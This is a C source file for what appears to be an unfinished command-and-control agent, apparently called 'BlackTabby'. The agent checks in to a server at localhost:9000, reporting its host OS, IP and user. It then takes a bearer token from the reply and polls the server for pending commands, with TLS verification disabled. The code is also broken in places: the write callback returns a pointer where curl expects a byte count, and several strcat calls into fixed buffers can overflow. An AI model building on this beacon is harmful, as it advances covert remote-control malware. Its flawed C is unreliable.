#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
#include <json-c/json.h>

//apt install libjson-c-dev

// global variables
char *first_response; 
struct json_object *parsed_json;
struct json_object *token;
struct json_object *refresh;
struct json_object *id;
struct json_object *rev;

// first callback function on first_Check_in post request
char *function_pt(void *ptr, size_t size, size_t nmemb, void *stream){
    //printf("%s",ptr);
    //call back function
    //printf("test\n");
    first_response = malloc(nmemb * 2);
    strncpy(first_response,ptr,nmemb);
    return first_response;
}

void first_check_in(char *urls){
	CURL *curl;
	CURLcode res;
	//POST REQUEST
	// need to create functions to run inital data commands and pass them to this data string below
	const char *data = "{\"agent_id\":\"123\",\"os\":\"Linux\",\"ip\":\"0.0.0.0\",\"user\":\"notroot\",\"completed_commands\":[],\"pending_commands\":[]}";
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl){
		struct curl_slist *chunk = NULL;
		curl_easy_setopt(curl, CURLOPT_POST, 12L);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
		/* Settings headers below */
		chunk = curl_slist_append(chunk,"User-Agent:QmxhY2tUYWJieQo=");
		chunk = curl_slist_append(chunk,"Content-Type:application/json");
		chunk = curl_slist_append(chunk,"Agent:TGVhcm5pbmdDVG9CRWxpdGUK");
		/////////////////////////////
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl,CURLOPT_URL,urls);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, function_pt);
		//curl_easy_setopt(curl, CURLOPT_WRITEDATA, jsonz);
		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
}



// this needs to be run on a loop
//headers = {"doc_id":self.doc_id,"Authorization":"Bearer {}".format(self.access_token)}
// performs get request to check if commands have been added to pending commands array in json document in database
int polling2(char *id,char *token){
	CURL *curl;
	CURLcode res;
	//GET REQUEST
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl){
		struct curl_slist *chunk2 = NULL;
		char header_doc[100] = "doc_id:";
		char header_auth[100] = "Authorization:";
		strcat(header_doc,id);
		strcat(header_auth,token);
		printf("%s\n",header_auth );
		printf("%s\n",header_doc );
		puts("midway through curl\n");
		//chunk2 = curl_slist_append(chunk2,"test:test");
		//chunk2 = curl_slist_append(chunk2,"fake:fake");
		puts("completed chunk");
		//curl_easy_setopt(curl,CURLOPT_HTTPHEADER,chunk2);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		char url[100] = "https://127.0.0.1:9000/poll";
		curl_easy_setopt(curl,CURLOPT_URL,url);
		// insert callback function here
		//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, function_pt);
		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
	return 0;
}



int polling(char *id,char *token){
	CURL *curl;
	CURLcode res;
	//POST REQUEST
	// need to create functions to run inital data commands and pass them to this data string below
	//const char *data = "{\"agent_id\":\"123\",\"os\":\"Linux\",\"ip\":\"0.0.0.0\",\"user\":\"notroot\",\"completed_commands\":[],\"pending_commands\":[]}";
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl){
		struct curl_slist *chunk = NULL;
		//curl_easy_setopt(curl, CURLOPT_POST, 12L);
		//curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
		/* Settings headers below */
		char header_doc[100] = "doc_id:";
		char header_auth[300] = "Authorization:Bearer ";
		strcat(header_doc,id);
		strcat(header_auth,token);
		printf("%s\n",header_auth );
		printf("%s\n",header_doc );
		chunk = curl_slist_append(chunk,header_auth);
		chunk = curl_slist_append(chunk,header_doc);
		//chunk = curl_slist_append(chunk,"Agent:TGVhcm5pbmdDVG9CRWxpdGUK");
		/////////////////////////////
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl,CURLOPT_URL,"https://127.0.0.1:9000/poll");
		//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, function_pt);
		//curl_easy_setopt(curl, CURLOPT_WRITEDATA, jsonz);
		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
}

















/*

	// below is for getting document id and header which doesnt seem neccesary yet
	char *header_buffer;
	size_t header_sz;
	header_sz = snprintf(NULL,0,"{\"doc_id\":\"%s\",\"Authorization\":\"Bearer %s\"}",id,token);
	header_buffer = (char *)malloc(header_sz + 1);
	if (header_buffer != NULL){
		puts("Successfully Allocated Buffer");
		snprintf(header_buffer, header_sz+1, "{\"doc_id\":\"%s\",\"Authorization\":\"Bearer %s\"}",id,token);
		//header_buffer now has the header string needed for get request
	}

	else
		exit(1);

	return 0; // return 0 for false and return 1 for true

	}

*/







int main(void){
	char *test_url = "https://localhost:9000/first_check_in";
	char *polling_url = "https://localhost:9000/poll";
	first_check_in(test_url);
	// setting up json
	//printf("%s\n",first_response);
	///// remember to free first response when done
	//free(first_response);
	parsed_json = json_tokener_parse(first_response); 
	// parsed json object
	json_object_object_get_ex(parsed_json,"id",&id);
	// getting each section of the json
	json_object_object_get_ex(parsed_json,"refresh",&refresh);
	json_object_object_get_ex(parsed_json,"rev",&rev);
	json_object_object_get_ex(parsed_json,"token",&token);
	//printf("%s\n",json_object_get_string(id));
	//printf("%s\n",json_object_get_string(refresh));
	//printf("%s\n",json_object_get_string(rev));
	//printf("%s\n",json_object_get_string(token));
	char *access_token = json_object_get_string(token);
	char *document_id = json_object_get_string(id);
	// saving document id as a string
	// saving access token as a string
	printf("Successfully Completed Check In\n");
	printf("Successfully Extracted first response into variables");
	polling(document_id,access_token);


	return 0;

}

/* PAYLOAD AND HEADERS */
//payload = {"agent_id":"{}".format(random_num),"os":"Windows","ip":"0.0.0.0","user":"guest","completed_commands":[],"pending_commands":[]}
/*


  'User-Agent': 'QmxhY2tUYWJieQo=',
	  'Content-Type': 'application/json',
	  'Agent': 'TGVhcm5pbmdDVG9CRWxpdGUK'


*/

/* 				after first check in 
				response will be something like this 


{
  "id": "40e136e13e72c126bda77cb133002186", 
  "refresh": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzczOTkzMTgsIm5iZiI6MTU3NzM5OTMxOCwianRpIjoiNDg5ZDgxZDUtNjNmYi00N2M3LTgxNDAtNGE5MzliN2U5NmI4IiwiZXhwIjoxNTc5OTkxMzE4LCJpZGVudGl0eSI6IjEyMyIsInR5cGUiOiJyZWZyZXNoIn0.xoxYCsYKetCiEaMZB9Vf8F0oClW6EDdCgjrYM_FfNDI", 
  "rev": "1-bdd018084a30fe28d15cdddfc4abc167", 
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzczOTkzMTgsIm5iZiI6MTU3NzM5OTMxOCwianRpIjoiMzlhZDk3OTAtMzQzYi00MTMxLTgzNWEtZDcwNTg4OTdlNjhjIiwiZXhwIjoxNTc3NDAwMjE4LCJpZGVudGl0eSI6IjEyMyIsImZyZXNoIjpmYWxzZSwidHlwZSI6ImFjY2VzcyJ9.3U1dZTbnHpxrjkPTU1E_l1Ex8bDhs4JPX0NplG9W6yE"
}

 */ 